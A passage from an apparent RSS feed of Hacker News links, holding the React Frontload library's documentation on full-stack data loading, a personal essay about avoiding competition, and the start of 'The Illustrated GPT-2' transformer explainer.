<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactroot="" data-reactid="1" data-react-checksum="1067123220"><div data-reactid="6"><div data-reactid="7"><p><img src="https://davnicwil.com/image/react-frontload-logo.png" width="100" height="100" data-reactid="8"></p></div><p data-reactid="10"><h2 data-reactid="11">Simple full-stack data loading for React</h2></p><p><a href="https://www.npmjs.com/package/react-frontload" data-reactid="13"><img src="https://img.shields.io/npm/v/react-frontload?style=social&amp;logo=npm" data-reactid="14"></a><a href="https://github.com/davnicwil/react-frontload" data-reactid="15"><img src="https://img.shields.io/github/stars/davnicwil/react-frontload?style=social" data-reactid="16"></a><a href="https://www.npmjs.com/package/react-frontload" data-reactid="17"><img src="https://img.shields.io/npm/dm/react-frontload?style=social" data-reactid="18"></a><a href="https://twitter.com/davnicwil" data-reactid="19"><img src="https://img.shields.io/twitter/url?label=made%20by%20%40davnicwil&amp;style=social&amp;url=https%3A%2F%2Fdavnicwil.com" data-reactid="20"></a></p></div><p data-reactid="21">React Frontload is a library to load and manage data inline in React components that works on both client and server.</p><div data-reactid="22"><ul data-reactid="23"><li data-reactid="24"><span data-reactid="25">Load data with a hook which works on client and server</span></li><li data-reactid="26"><span data-reactid="27">Data is managed in component state - no need for Redux / MobX</span></li><li data-reactid="28"><span data-reactid="29">Written in TypeScript, typing is easy as everything's inline</span></li><li data-reactid="30"><span data-reactid="31">Less than 3.5KB Gzipped, zero dependencies</span></li></ul></div><div data-reactid="32"><div data-reactid="33"><!-- react-text: 34 --><p>v2 has just shipped! </p><!-- /react-text --><p><a href="https://davnicwil.com/v2" data-reactid="35">See here</a></p><!-- react-text: 36 --><p> for the motivation for v2 and comparison with v1</p><!-- /react-text --></div></div><div data-reactid="37"><p>Install</p><p>npm install react-frontload</p></div><div id="problem" data-reactid="53"><h3 data-reactid="54">What problem does this solve?</h3><p><a href="#problem" data-reactid="55">#</a></p></div><p data-reactid="56">React provides no built-in way to do data loading - it's left for you to implement. Doing this is tricky in a React app that uses server side rendering (SSR) because client and server rendering work quite differently: Client render is async so data can be loaded inside components when they render, but server render is completely synchronous - the data must be loaded before render happens.</p><p data-reactid="57">Data loading is, of course, async. The client component-centric data loading pattern is nice, but it's incompatible with synchronous server render. React simply has no mechanism to wait for data to load when components render on SSR. There's a further problem too: React also provides no built-in way to hydrate data loaded during SSR into client state on first render. This is also up to you to implement.</p><p data-reactid="58">So, full stack data loading in React is a tricky problem. A couple of solutions have emerged:</p><ol data-reactid="59"><li data-reactid="60"><p data-reactid="61">Load data at the route level, instead of the component level, then pass data to all components under the route. Works on SSR since the route is known in the request, so data can be loaded before render begins. Can be implemented by piecing together router and state manager libraries.</p></li><li data-reactid="62"><p data-reactid="63">Use a framework that wraps React and abstracts the problem away, perhaps by providing a framework-specific async data loading function for components that works on SSR, and also takes care of hydrating state on the client.</p></li></ol><p data-reactid="64">React Frontload aims to provide a third way - the component-centric data loading pattern available full stack, but without having to buy into a whole framework just to get this feature. It's just a small library that solves this one problem, and can be used in any React stack.</p><p data-reactid="68">Here's an example of loading data into a component with React Frontload</p><p><span>const</span> <span>Component</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span>
    stuff<span>:</span> <span>await</span> api<span>.</span><span>getStuff</span><span>(</span><span>)</span>
  <span>}</span><span>)</span><span>)</span>

  <span>if</span> <span>(</span>frontloadMeta<span>.</span>pending<span>)</span> <span>return</span> <span>&lt;</span>div<span>&gt;</span>loading<span>&lt;</span><span>/</span>div<span>&gt;</span>
  <span>if</span> <span>(</span>frontloadMeta<span>.</span>error<span>)</span>   <span>return</span> <span>&lt;</span>div<span>&gt;</span>error<span>&lt;</span><span>/</span>div<span>&gt;</span>

  <span>return</span> <span>&lt;</span>div<span>&gt;</span><span>{</span>data<span>.</span>stuff<span>}</span><span>&lt;</span><span>/</span>div<span>&gt;</span>
<span>}</span>
</p><p data-reactid="70"><!-- react-text: 71 -->Here we have a <!-- /react-text --><span data-reactid="72">Component</span><!-- react-text: 73 --> that needs to load <!-- /react-text --><span data-reactid="74">stuff</span><!-- react-text: 75 --> from an API, with the usual loading state whilst it loads and some sort of error state if loading fails for some reason.<!-- /react-text --></p><p data-reactid="76"><!-- react-text: 77 -->With React Frontload, we do this by passing an async data loading function to the <!-- /react-text --><span data-reactid="78">useFrontload</span><!-- react-text: 79 --> hook. The hook loads the return value of the function into<!-- /react-text --><!-- react-text: 80 --> <!-- /react-text --><span data-reactid="81">data</span><!-- react-text: 82 -->, and gives us<!-- /react-text --><!-- react-text: 83 --> <!-- /react-text --><span data-reactid="84">frontloadMetadata</span><!-- react-text: 85 --> out the box so we can see when it's still <!-- /react-text --><span data-reactid="86">pending</span><!-- react-text: 87 --> or if an <!-- /react-text --><span data-reactid="88">error</span><!-- react-text: 89 --> is thrown when running the function.<!-- /react-text --></p><p data-reactid="90"><!-- react-text: 91 -->That's it - we're done in those few lines of code. That's the power of doing data loading inline in a component. And the best part here is that this just works on the server. If we render<!-- /react-text --><!-- react-text: 92 --> <!-- /react-text --><span data-reactid="93">Component</span><!-- react-text: 94 --> in a route, any route,<!-- /react-text --><!-- react-text: 95 --> <!-- /react-text --><span data-reactid="96">stuff</span><!-- react-text: 97 --> will load.<!-- /react-text --></p><p data-reactid="98"><!-- react-text: 99 -->To emphasise the ease and lack of plumbing involved in making changes, let's have <!-- /react-text --><span data-reactid="100">Component</span><!-- react-text: 101 --> load some more stuff:<!-- /react-text --></p><p><span>const</span> <span>Component</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span>
    stuff<span>:</span> <span>await</span> api<span>.</span><span>getStuff</span><span>(</span><span>)</span><span>,</span>
    moreStuff<span>:</span> <span>await</span> api<span>.</span><span>getMoreStuff</span><span>(</span><span>)</span> 
  <span>}</span><span>)</span><span>)</span>

  <span>if</span> <span>(</span>frontloadMeta<span>.</span>pending<span>)</span> <span>return</span> <span>&lt;</span>div<span>&gt;</span>loading<span>&lt;</span><span>/</span>div<span>&gt;</span>
  <span>if</span> <span>(</span>frontloadMeta<span>.</span>error<span>)</span>   <span>return</span> <span>&lt;</span>div<span>&gt;</span>error<span>&lt;</span><span>/</span>div<span>&gt;</span>

  <span>return</span> <span>&lt;</span>div<span>&gt;</span><span>{</span>data<span>.</span>stuff<span>}</span> and <span>{</span>data<span>.</span>moreStuff<span>}</span><span>&lt;</span><span>/</span>div<span>&gt;</span> 
<span>}</span>
</p><p data-reactid="103"><!-- react-text: 104 -->It's literally that simple - just add whatever you need to<!-- /react-text --><!-- react-text: 105 --> <!-- /react-text --><span data-reactid="106">useFrontload</span><!-- react-text: 107 --> and use it. Remember that this is all automatically typed. If the value returned by the<!-- /react-text --><!-- react-text: 108 --> <!-- /react-text --><span data-reactid="109">getMoreStuff</span><!-- react-text: 110 --> api call is a<!-- /react-text --><span data-reactid="111">string</span><!-- react-text: 112 -->,<!-- /react-text --><!-- react-text: 113 --> <!-- /react-text --><span data-reactid="114">data.moreStuff</span><!-- react-text: 115 --> has the string type, and you'll get errors if you try to use it as a number.<!-- /react-text --></p><p data-reactid="116"><!-- react-text: 117 -->You may have noticed that the above code loads data less efficiently than it could. <!-- /react-text --><span data-reactid="118">api.getStuff()</span><!-- react-text: 119 --> and<!-- /react-text --><!-- react-text: 120 --> <!-- /react-text --><span data-reactid="121">api.getMoreStuff()</span><!-- react-text: 122 --> are called in serial, when they could probably be called in parallel. Since it's just Javascript, though, we can change this:<!-- /react-text --></p><p><span>const</span> <span>{</span> data<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>[</span>stuff<span>,</span> moreStuff<span>]</span> <span>=</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
    api<span>.</span><span>getStuff</span><span>(</span><span>)</span><span>,</span>
    api<span>.</span><span>getMoreStuff</span><span>(</span><span>)</span>
  <span>]</span><span>)</span>

  <span>return</span> <span>{</span> stuff<span>,</span> moreStuff <span>}</span>
<span>}</span><span>)</span>
</p><p data-reactid="124">In fact as data loaders get more complex, you can use any combination of serial and parallel that you need. It's just Javascript - you have the full power of the language without any abstractions or misdirection on top.</p><p data-reactid="125"><!-- react-text: 126 -->There is one more piece to this - what about updating data? Since React Frontload uses React component state to hold<!-- /react-text --><!-- react-text: 127 --> <!-- /react-text --><span data-reactid="128">data</span><!-- react-text: 129 -->, updating it is just a case of updating that state. React Frontload provides another function, called<!-- /react-text --><!-- react-text: 130 --> <!-- /react-text --><span data-reactid="131">setData</span><!-- react-text: 132 -->, for this:<!-- /react-text --></p><p><span>const</span> <span>Component</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>{</span> data<span>,</span> setData<span>,</span> frontloadMeta <span>}</span> <span>=</span> <span>useFrontload</span><span>(</span><span>'my-component'</span><span>,</span> <span>async</span> <span>(</span><span><span>{</span> api <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span>
    stuff<span>:</span> <span>await</span> api<span>.</span><span>getStuff</span><span>(</span><span>)</span>
  <span>}</span><span>)</span><span>)</span>

  <span>if</span> <span>(</span>frontloadMeta<span>.</span>pending<span>)</span> <span>return</span> <span>&lt;</span>div<span>&gt;</span>loading<span>&lt;</span><span>/</span>div<span>&gt;</span>
  <span>if</span> <span>(</span>frontloadMeta<span>.</span>error<span>)</span>   <span>return</span> <span>&lt;</span>div<span>&gt;</span>error<span>&lt;</span><span>/</span>div<span>&gt;</span>

  <span>const</span> <span>updateStuff</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>const</span> updatedStuff <span>=</span> <span>await</span> <span>updateStuff</span><span>(</span><span>'new value'</span><span>)</span> 
      <span>setData</span><span>(</span><span>data</span> <span>=&gt;</span> <span>(</span><span>{</span> <span>...</span>data<span>,</span> stuff<span>:</span> updatedStuff <span>}</span><span>)</span><span>)</span> 
    <span>}</span> <span>catch</span> <span>{</span>
      
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>(</span>
    <span>&lt;</span><span>&gt;</span>
      <span>&lt;</span>div<span>&gt;</span><span>{</span>data<span>.</span>stuff<span>}</span><span>&lt;</span><span>/</span>div<span>&gt;</span>
      <span>&lt;</span>button onClick<span>=</span><span>{</span>updateStuff<span>}</span><span>&gt;</span>update<span>&lt;</span><span>/</span>button<span>&gt;</span>
    <span>&lt;</span><span>&gt;</span>
  <span>)</span>
</p><p data-reactid="134"><!-- react-text: 135 -->Again, this is all just inline in the component with zero plumbing. If you're coming from Redux, you can think of<!-- /react-text --><!-- react-text: 136 --> <!-- /react-text --><span data-reactid="137">setData</span><!-- react-text: 138 --> a little bit like a mini reducer. It takes the existing value of<!-- /react-text --><!-- react-text: 139 --> <!-- /react-text --><span data-reactid="140">data</span><!-- react-text: 141 --> as an argument, and you merge updates into it to return an updated value of<!-- /react-text --><!-- react-text: 142 --> <!-- /react-text --><span data-reactid="143">data</span><!-- react-text: 144 -->.<!-- /react-text --></p><p data-reactid="145">And that's it - full stack data loading and management inline in your React components.</p><p data-reactid="149"><!-- react-text: 150 -->The <!-- /react-text --><span data-reactid="151">useEffect</span><!-- react-text: 152 --> hook seen in the example above is the core of React Frontload - the code you'll actually work with in your components - but there is also a small amount of one-time setup code to write to get it to work.<!-- /react-text --></p><p data-reactid="153"><!-- react-text: 154 -->Essentially this is setting up wrappers around your server render logic, and your React application on both server and client, to make the<!-- /react-text --><span data-reactid="155">useFrontload</span><!-- react-text: 156 --> hook work, and also enable hydration of state loaded on server render to the client.<!-- /react-text --></p><p data-reactid="157">App Provider</p><p data-reactid="158">Wrap your app in the React Frontload provider</p><p><span>import</span> <span>{</span> FrontloadProvider <span>}</span> <span>from</span> <span>'react-frontload'</span>

<span>const</span> <span>App</span> <span>=</span> <span>(</span><span><span>{</span> frontloadState <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span>
  <span>&lt;</span>FrontloadProvider initialState<span>=</span><span>{</span>frontloadState<span>}</span><span>&gt;</span>
    <span>&lt;</span>Content<span>&gt;</span><span>...</span><span>&lt;</span><span>/</span>Content<span>&gt;</span>
  <span>&lt;</span><span>/</span>FrontloadProvider<span>&gt;</span>
<span>)</span>
</p><p data-reactid="160">Server render</p><p data-reactid="161"><!-- react-text: 162 -->On server render, you need to wrap your existing synchronous server render code with<!-- /react-text --><!-- react-text: 163 --> <!-- /react-text --><span data-reactid="164">reactFrontloadServerRender</span><!-- react-text: 165 -->.<!-- /react-text --></p><p data-reactid="166"><!-- react-text: 167 -->You can think of this as the polyfill that allows React Frontload to load data asynchronously on server render. It just uses regular React server rendering under the hood, and its output is exactly the same. Read more about this <!-- /react-text --><a href="#how-it-works" data-reactid="168">here</a><!-- react-text: 169 -->.<!-- /react-text --></p><p><span>import</span> <span>{</span> renderToString <span>}</span> <span>from</span> <span>'react-dom/server'</span>
<span>import</span> <span>{</span> createFrontloadState<span>,</span> frontloadServerRender <span>}</span> <span>from</span> <span>'react-frontload'</span>
<span>import</span> serverApi <span>from</span> <span>'./serverApi'</span>

app<span>.</span><span>get</span><span>(</span><span>'*'</span><span>,</span> <span>async</span> <span>(</span><span>req<span>,</span> res</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>...</span>

  
  
  <span>const</span> frontloadState <span>=</span> createFrontloadState<span>.</span><span>server</span><span>(</span><span>{</span>
    
    
    
    context<span>:</span> <span>{</span> api<span>:</span> serverApi <span>}</span>
  <span>}</span><span>)</span>

  <span>try</span> <span>{</span>
    
    <span>const</span> <span>{</span> rendered<span>,</span> data <span>}</span> <span>=</span> <span>await</span> <span>frontloadServerRender</span><span>(</span><span>{</span>
      frontloadState<span>,</span>
      <span>render</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>renderToString</span><span>(</span><span>&lt;</span>App frontloadState<span>=</span><span>{</span>frontloadState<span>}</span> <span>/</span><span>&gt;</span><span>)</span>
    <span>}</span><span>)</span>

    res<span>.</span><span>send</span><span>(</span><span><span>`</span><span>
      &lt;html&gt;
        ...
        &lt;!-- server rendered markup --&gt;
        </span><span><span>${</span>rendered<span>}</span></span><span>

        &lt;!-- loaded data (to be hydrated on client) --&gt;
        &lt;script&gt;window._frontloadData=</span><span><span>${</span><span>toSanitizedJSON</span><span>(</span>data<span>)</span><span>}</span></span><span>&lt;/script&gt;
        ...
      &lt;/html&gt;
    </span><span>`</span></span><span>)</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    
  <span>}</span>
<span>}</span><span>)</span>
</p><p data-reactid="171"><!-- react-text: 172 -->The output of<!-- /react-text --><!-- react-text: 173 --> <!-- /react-text --><span data-reactid="174">reactFrontloadServerRender</span><!-- react-text: 175 --> contains a <!-- /react-text --><span data-reactid="176">rendered</span><!-- react-text: 177 --> string, which is just the server render output to inject into your HTML template as usual.<!-- /react-text --></p><p data-reactid="178"><!-- react-text: 179 -->It also contains a <!-- /react-text --><span data-reactid="180">data</span><!-- react-text: 181 --> object, which you should serialize into your HTML as sanitised JSON.<!-- /react-text --><!-- react-text: 182 --> <!-- /react-text --><span data-reactid="183">data</span><!-- react-text: 184 --> contains all the data loaded for the current view across all components, and the purpose of this is to hydrate this data into React Frontload on the client (using<!-- /react-text --><!-- react-text: 185 --> <!-- /react-text --><span data-reactid="186">initialState</span><!-- react-text: 187 -->) so that it does not have to be reloaded on first render. This pattern is essentially the same as the one you see with other state managers such as Redux.<!-- /react-text --></p><p data-reactid="188">Client render</p><p data-reactid="189">The last remaining step is client integration, which is rather simpler. Just initialise a React Frontload state object on the client using your serialized data from server render, and pass it to the provider.</p><p><span>import</span> clientApi <span>from</span> <span>'./clientApi'</span>

<span>const</span> frontloadState <span>=</span> createFrontloadState<span>.</span><span>client</span><span>(</span><span>{</span>
  
  
  context<span>:</span> <span>{</span> api<span>:</span> clientApi <span>}</span><span>,</span>

  
  serverRenderedData<span>:</span> window<span>.</span>_frontloadData
<span>}</span><span>)</span>
<span>...</span>
ReactDOM<span>.</span><span>render</span><span>(</span><span>&lt;</span>App frontloadState<span>=</span><span>{</span>frontloadState<span>}</span> <span>/</span><span>&gt;</span><span>,</span> <span>...</span><span>)</span>
</p><p data-reactid="194">For most usecases, you don't need to care about this.</p><p data-reactid="195">That said, all abstractions are leaky at some point, and it's always useful to understand how things work under the hood so that when they behave unexpectedly, you can figure out why.</p><p data-reactid="196">The mechanism used to polyfill async on server render is deliberately very simple. As shown in the code above, React Frontload wraps ordinary synchronous server render code with an async function.</p><p data-reactid="197"><!-- react-text: 198 -->It works by running that synchronous function, and collecting the promises encountered on each render of a<!-- /react-text --><!-- react-text: 199 --> <!-- /react-text --><span data-reactid="200">useFrontload</span><!-- react-text: 201 --> hook. After the render, the collected promises are then awaited, which loads the data in those functions the same as it would be on the client. Now, React Frontload runs the server render again - this time injecting the data loaded from the previous run into each component ahead of the render. In this new render round, if no new<!-- /react-text --><!-- react-text: 202 --> <!-- /react-text --><span data-reactid="203">useFrontload</span><!-- react-text: 204 --> hooks are encountered (i.e. if there are no nested components with a<!-- /react-text --><!-- react-text: 205 --> <!-- /react-text --><span data-reactid="206">useFrontload</span><!-- react-text: 207 --> hook), then the output of this render is returned as the final output. If nested<!-- /react-text --><!-- react-text: 208 --> <!-- /react-text --><span data-reactid="209">useFrontload</span><!-- react-text: 210 --> hooks<!-- /react-text --><!-- react-text: 211 --> <!-- /react-text --><span data-reactid="212">are</span><!-- react-text: 213 --> found, the process repeats.<!-- /react-text --></p><ul id="api-useFrontload" data-reactid="225"><li data-reactid="226"><span data-reactid="227">useFrontload</span><a href="#api-useFrontload" data-reactid="228">#</a></li></ul><p data-reactid="229"><span data-reactid="230">useFrontload</span><!-- react-text: 231 --> is the React Frontload hook.<!-- /react-text --></p><p><span>import</span> <span>{</span> useFrontload <span>}</span> <span>from</span> <span>'react-frontload'</span>

<span>useFrontload</span><span>(</span>
  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://davnicwil.com/react-frontload">https://davnicwil.com/react-frontload</a></em></p>]]>
            </description>
            <link>https://davnicwil.com/react-frontload</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027368</guid>
            <pubDate>Sun, 08 Nov 2020 17:46:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Winning Without Competing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027249">thread link</a>) | @jdcampolargo
<br/>
November 8, 2020 | https://www.juandavidcampolargo.com/blog/winning-competion | <a href="https://web.archive.org/web/*/https://www.juandavidcampolargo.com/blog/winning-competion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-405d26435b59c98dcb8b"><div><p>It was Monday at 9:58 PM, and I finished a CAD assignment with the help of my TA. Nick is a great dude, not only because of how helpful and knowledgeable he is but because of his willingness to explain the fundamentals of CAD and engineering until one deeply understands it.&nbsp;</p><p>It’s become a routine when I finish the assignments, we talk about life, economics, psychology, and anything that comes our way. In our conversation, the topic of competition came up.&nbsp;</p><p>He tells me when he applied to colleges, he avoided the “famous” and “prestigious” places from the East Coast because of the overfocus on competition, and the lack of focus on what you’re genuinely curious about.&nbsp;</p><p>He says, “Students don’t do what they like or what they want to learn more about, rather they tend to do what they’re good at because the school, parents, friends, etc tell them to.”</p><p>As soon as he said that, sparks started happening in my head, and I was ready to share my response about the dangers of competition.&nbsp;</p><p>Competition is great [1], yet I avoid it as much as possible. Competing with others can lead you to an unhealthy path where you end up doing what you thought would make you a winner, and not what would make you enjoy what you do.&nbsp;</p><p>Nick tells me that often being the best and competing with others can often lead to putting other people down. In zero-sum games, if I win, that means you have to lose. There are plenty of cases where it's positive-sum, where no one wins at someone else’s expense.&nbsp;</p><p>I avoid competition [2] because if you want what other people want 1) it becomes harder to get what you want, and 2) even if you win or get what you wanted, you may realize that was not what you wanted.&nbsp;</p><p>It doesn’t have to be this way, as there are many alternatives to thrive without putting other people down and doing things you want to do by following your curiosity and interests.&nbsp;</p><p>How?</p><p><strong>You uniquely define what you do in a way that no one else is doing it.&nbsp;</strong></p><p>If you are passionate about entrepreneurship, you can’t call yourself an “entrepreneur.” You need to go deeper. For instance, if you are an entrepreneur, define the areas, the people who you work with, where you work, how you work, and why you work.&nbsp;</p><p>You might be an entrepreneur focused on the well-being of the environment and human life in the southern parts of the country who is trying to implement Algae-based biofuel on tractors. That’s specific and you can go even deeper like the states, the brand of the tractors, and the type of algae.&nbsp;</p><p>Or if you like writing, you can’t call yourself a “writer.” See within and start unburying. You could write about how the sophisticated Roman city of Pompeii affected how we think about building and designing cities in the 20th and 21st centuries.&nbsp;</p><p>I know you may feel uncomfortable being that specific because you may think: 1) You’re passionate about more topics, 2) You may lose opportunities, 3) You may not like being that specific.&nbsp;</p><p>Frankly, that’s how I feel too. However, I can define what I do in such a unique way so I can see where to go or what to do. I don’t have to follow it and can always change it. In my case, I didn’t even worry about it, and I followed what interested me and what seemed curious.&nbsp;</p><p>I’ve realized that following your genuine curiosity is the best way to avoid competition and win (whatever that means for you).&nbsp;</p><p>I followed my curiosity and I can look back at the essays. Although they may seem like different topics, they all have one purpose: making my readers more optimistic, ambitious, and curious.&nbsp;</p><p>Define what you do uniquely so you have no competition. That way, you’ll win without winning and without other people down.&nbsp;</p><p>And that was only ten minutes of one of my chats with Nick. Our conversations get more interesting every week. If you’d like to hear more about them, join hundreds of people in the <a href="http://juandavidcampolargo.com/newsletter" target="_blank"><strong><em>Weekly Memos</em></strong></a><strong><em>.</em></strong></p><p><strong>Notes</strong></p><p>[1] I’m not talking about “Market Competition.” I’m referring to competition at a personal and an individual level.</p><p>[2] I don’t just avoid competition for the sake of avoiding it. But if I find myself competing for no reason, it could be a sign that I’m not thinking for myself. </p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604669904171_5110"><p>If you’re into interesting ideas (like the one you just read), sign up for my <a href="https://juandavidcampolargo.com/newsletter" target="_blank">Weekly Memos</a>, and I’ll send you new essays right when they come out. Better than having to check the site!</p></div></div>]]>
            </description>
            <link>https://www.juandavidcampolargo.com/blog/winning-competion</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027249</guid>
            <pubDate>Sun, 08 Nov 2020 17:30:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Illustrated GPT-2 (Visualizing Transformer Language Models)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027205">thread link</a>) | @bjourne
<br/>
November 8, 2020 | http://jalammar.github.io/illustrated-gpt2/ | <a href="https://web.archive.org/web/*/http://jalammar.github.io/illustrated-gpt2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><span>Discussions:
<a href="https://news.ycombinator.com/item?id=20677411">Hacker News (64 points, 3 comments)</a>, <a href="https://www.reddit.com/r/MachineLearning/comments/cp8prq/p_the_illustrated_gpt2_visualizing_transformer/">Reddit r/MachineLearning (219 points, 18 comments)</a>
</span></p>

<p><span>Translations: <a href="https://habr.com/ru/post/490842/">Russian</a></span></p>

<p><img src="http://jalammar.github.io/images/gpt2/openAI-GPT-2-3.png">
  <br>
</p>

<p>This year, we saw a dazzling application of machine learning. <a href="https://openai.com/blog/better-language-models/">The OpenAI GPT-2</a> exhibited impressive ability of writing coherent and passionate essays that exceed what we anticipated current language models are able to produce. The GPT-2 wasn’t a particularly novel architecture – it’s architecture is very similar to the decoder-only transformer. The GPT2 was, however, a very large, transformer-based language model trained on a massive dataset. In this post, we’ll look at the architecture that enabled the model to produce its results. We will go into the depths of its self-attention layer. And then we’ll look at applications for the decoder-only transformer beyond language modeling.</p>

<p>My goal here is to also supplement my earlier post, <a href="http://jalammar.github.io/illustrated-transformer/">The Illustrated Transformer</a>, with more visuals explaining the inner-workings of transformers, and how they’ve evolved since the original paper. My hope is that this visual language will hopefully make it easier to explain later Transformer-based models as their inner-workings continue to evolve.</p>

<!--more-->

<div>

  <p><strong>Contents</strong></p>

  <ul>
    <li><strong><a href="#part-1-got-and-language-modeling">Part 1: GPT2 And Language Modeling</a></strong>
      <ul>
        <li>What is a Language Model</li>
        <li>Transformers for Language Modeling</li>
        <li>One Difference From BERT</li>
        <li>The Evolution of The Transformer Block</li>
        <li>Crash Course in Brain Surgery: Looking Inside GPT-2</li>
        <li>A Deeper Look Inside</li>
        <li>End of part #1: The GPT-2, Ladies and Gentlemen</li>
      </ul>
    </li>
    <li><strong><a href="#part-2-illustrated-self-attention">Part 2: The Illustrated Self-Attention</a></strong>
      <ul>
        <li>Self-Attention (without masking)</li>
        <li>1- Create Query, Key, and Value Vectors</li>
        <li>2- Score</li>
        <li>3- Sum</li>
        <li>The Illustrated Masked Self-Attention</li>
        <li>GPT-2 Masked Self-Attention</li>
        <li>Beyond Language modeling</li>
        <li>You’ve Made it!</li>
      </ul>
    </li>
    <li><strong><a href="#part-3-beyond-language-modeling">Part 3: Beyond Language Modeling</a></strong>
      <ul>
        <li>Machine Translation</li>
        <li>Summarization</li>
        <li>Transfer Learning</li>
        <li>Music Generation</li>
      </ul>
    </li>
  </ul>

</div>

<h2 id="part-1-gpt2-and-language-modeling-">Part #1: GPT2 And Language Modeling <a href="#part-1-got-and-language-modeling" name="part-1-got-and-language-modeling">#</a></h2>

<p>So what exactly is a language model?</p>

<h3 id="what-is-a-language-model">What is a Language Model</h3>
<p>In <a href="http://jalammar.github.io/illustrated-word2vec/">The Illustrated Word2vec</a>, we’ve looked at what a language model is – basically a machine learning model that is able to look at part of a sentence and predict the next word. The most famous language models are smartphone keyboards that suggest the next word based on what you’ve currently typed.</p>

<p><img src="http://jalammar.github.io/images/word2vec/swiftkey-keyboard.png">
  <br>
</p>

<p>In this sense, we can say that the GPT-2 is basically the next word prediction feature of a keyboard app, but one that is much larger and more sophisticated than what your phone has. The GPT-2 was trained on a massive 40GB dataset called WebText that the OpenAI researchers crawled from the internet as part of the research effort. To compare in terms of storage size, the keyboard app I use, SwiftKey, takes up 78MBs of space. The smallest variant of the trained GPT-2, takes up 500MBs of storage to store all of its parameters. The largest GPT-2 variant is 13 times the size so it could take up more than 6.5 GBs of storage space.</p>

<p><img src="http://jalammar.github.io/images/gpt2/gpt2-sizes.png">
  <br>
</p>

<p>One great way to experiment with GPT-2 is using the <a href="https://gpt2.apps.allenai.org/?text=Joel%20is">AllenAI GPT-2 Explorer</a>. It uses GPT-2 to display ten possible predictions for the next word (alongside their probability score). You can select a word then see the next list of predictions to continue writing the passage.</p>

<h3 id="transformers-for-language-modeling">Transformers for Language Modeling</h3>

<p>As we’ve seen in The <a href="http://jalammar.github.io/illustrated-transformer/">Illustrated Transformer</a>, the original transformer model is made up of an encoder and decoder – each is a stack of what we can call transformer blocks. That architecture was appropriate because the model tackled machine translation  – a problem where encoder-decoder architectures have been successful in the past.</p>

<p><img src="http://jalammar.github.io/images/xlnet/transformer-encoder-decoder.png">
  <br>
</p>

<p>A lot of the subsequent research work saw the architecture shed either the encoder or decoder, and use just one stack of transformer blocks – stacking them up as high as practically possible, feeding them massive amounts of training text, and throwing vast amounts of compute at them (hundreds of thousands of dollars to train some of these language models, likely millions in the case of <a href="https://deepmind.com/blog/alphastar-mastering-real-time-strategy-game-starcraft-ii/">AlphaStar</a>).</p>

<p><img src="http://jalammar.github.io/images/gpt2/gpt-2-transformer-xl-bert-3.png">
  <br>
</p>

<p>How high can we stack up these blocks? It turns out that’s one of the main distinguishing factors between the different GPT2 model sizes:</p>

<p><img src="http://jalammar.github.io/images/gpt2/gpt2-sizes-hyperparameters-3.png">
  <br>
</p>

<h3 id="one-difference-from-bert">One Difference From BERT</h3>
<blockquote>
<strong>First Law of Robotics</strong><br>
A robot may not injure a human being or, through inaction, allow a human being to come to harm.
</blockquote>

<p>The GPT-2 is built using transformer decoder blocks. BERT, on the other hand, uses transformer encoder blocks. We will examine the difference in a following section. But one key difference between the two is that GPT2, like traditional language models, outputs one token at a time. Let’s for example prompt a well-trained GPT-2 to recite the first law of robotics:</p>

<p><img src="http://jalammar.github.io/images/xlnet/gpt-2-output.gif">
  <br>
</p>

<p>The way these models actually work is that after each token is produced, that token is added to the sequence of inputs. And that new sequence becomes the input to the model in its next step. This is an idea called “auto-regression”. This is one of the ideas that <a href="https://karpathy.github.io/2015/05/21/rnn-effectiveness/">made RNNs unreasonably effective</a>.</p>

<p><img src="http://jalammar.github.io/images/xlnet/gpt-2-autoregression-2.gif">
  <br>
</p>

<p>The GPT2, and some later models like TransformerXL and XLNet are auto-regressive in nature. BERT is not. That is a trade off. In losing auto-regression, BERT gained the ability to incorporate the context on both sides of a word to gain better results. XLNet brings back autoregression while finding an alternative way to incorporate the context on both sides.</p>

<h3 id="the-evolution-of-the-transformer-block">The Evolution of the Transformer Block</h3>

<p>The <a href="https://arxiv.org/abs/1706.03762">initial transformer paper</a> introduced two types of transformer blocks:</p>

